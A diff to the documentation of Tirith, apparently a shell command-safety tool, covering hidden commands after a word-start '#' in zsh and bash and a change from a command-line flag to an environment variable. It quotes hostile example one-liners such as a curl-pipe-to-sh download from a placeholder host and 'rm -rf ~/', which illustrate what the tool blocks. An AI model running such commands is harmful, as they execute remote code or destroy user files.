@@ -417,13 +417,18 @@ An interactive zsh reads a word-start `#` as an ordinary word character unless
 `interactivecomments` is set, and it is unset by default, so
 `echo hi #; curl https://example-cli.dev/x | sh` prints `hi #` and runs the
 pipe. bash does the same after `shopt -u interactive_comments`. The bash and
-zsh hooks read the option at every check and paste and then pass
-`--no-interactive-comments` (`tirith check` and `tirith paste`); fish,
-PowerShell and cmd hooks never do, and without the flag a word-start `#`
-starts a comment as before. For interactive POSIX exec and paste input with
-the flag, Tirith also analyzes a copy of the input in which each such `#` is
-escaped (`\#`), and adds what that reading finds to the analysis of the input
-as typed, which it never replaces: `echo hi #; rm -rf ~/` blocks, while
+zsh hooks read the option at every check and paste and then set
+`_TIRITH_INTERACTIVE_COMMENTS=0` for `tirith check` and `tirith paste`
+(`--no-interactive-comments` says the same on the command line). They use the
+environment rather than the flag because a pinned binary older than the hooks
+ignores the variable and keeps its own protection, while 0.4.1 reads an
+unknown `check` flag before `--` as the start of the checked command (and
+allows `curl ... | sh`) and rejects one on `paste`. fish, PowerShell and cmd
+hooks never set it, and without it a word-start `#` starts a comment as
+before. For interactive POSIX exec and paste input read that way, Tirith also
+analyzes a copy of the input in which each such `#` is escaped (`\#`), and
+adds what that reading finds to the analysis of the input as typed, which it
+never replaces: `echo hi #; rm -rf ~/` blocks, while
 `git status # check`, `gh issue view #12` and a pasted script with comment
 lines stay allowed. A finding only that reading produced says so at the start
 of its description, and one both readings produce is reported once. The copy
